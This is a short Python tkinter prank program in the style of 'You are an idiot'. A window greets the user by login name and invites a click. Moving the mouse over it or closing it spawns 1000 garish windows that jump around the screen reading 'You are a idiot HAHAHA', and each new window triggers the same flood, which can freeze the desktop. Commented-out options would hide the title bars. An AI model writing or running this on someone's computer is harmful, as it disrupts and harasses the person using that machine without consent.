import tkinter as tk
import random
import os

fonts=["bold", "italic", "underline"]
usrname = os.getlogin()
all_windows = []

def random_color():
    return "#{:02x}{:02x}{:02x}".format(
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def contrasting_text_color(bg_hex):
    r = int(bg_hex[1:3], 16)
    g = int(bg_hex[3:5], 16)
    b = int(bg_hex[5:7], 16)
    brightness = (r * 299 + g * 587 + b * 114) / 1000
    return "black" if brightness > 128 else "white"

def on_motion_once(event):
    event.widget.unbind("<Motion>")
    on_window_close()

def move_win(window, steps=30, delay=250):
    if steps <= 0:
        return
    x = random.randint(0, 1500)
    y = random.randint(0, 1500)
    window.geometry(f"+{x}+{y}")
    window.after(delay, move_win, window, steps - 1, delay)

def start_jumping_all():
    for win in all_windows[:]:
        move_win(win, steps=150, delay=100)

def on_window_close():
    for _ in range(1000): 
        create_new_window()
    start_jumping_all()

def create_new_window():
    win = tk.Toplevel()
    #win.overrideredirect(True)#отключить верхнюю панель(свернуть,развернуть,закрыть)/Disable the top panel (collapse, expand, close)

    bg = random_color()
    fg = contrasting_text_color(bg)

    w = random.randint(0, 1900)
    h = random.randint(0, 1800)
    x = random.randint(0, 1500)
    y = random.randint(0, 1500)
    win.geometry(f"{w}x{h}+{x}+{y}")
    win.configure(bg=bg)

    label = tk.Label(
        win,
        text=f"You are a idiot\nHAHAHAHAHAHAHAHAHA",#изменить текст после клика на первое окно/change the text after clicking on the first window
        font=("Arial", random.randint(10, 30), fonts[random.randint(0,2)]),
        bg=bg,
        fg=fg
    )
    label.pack(expand=True)

    win.bind("<Motion>", on_motion_once)
    win.protocol("WM_DELETE_WINDOW", on_window_close)

    all_windows.append(win)
    return win

root = tk.Tk()
#root.overrideredirect(True)#отключить верхнюю панель(свернуть,развернуть,закрыть)/Disable the top panel (collapse, expand, close)

bg_root = random_color()
fg_root = contrasting_text_color(bg_root)
root.configure(bg=bg_root)
root.geometry("300x200+200+200")

label = tk.Label(
    root,
    text=f"Hello {usrname}❤!\nClick on me",
    font=("Arial", random.randint(16, 32), "bold"),
    bg=bg_root,
    fg=fg_root
)
label.pack(expand=True)

root.bind("<Motion>", on_motion_once)
root.protocol("WM_DELETE_WINDOW", on_window_close)
all_windows.append(root)

tk.mainloop()
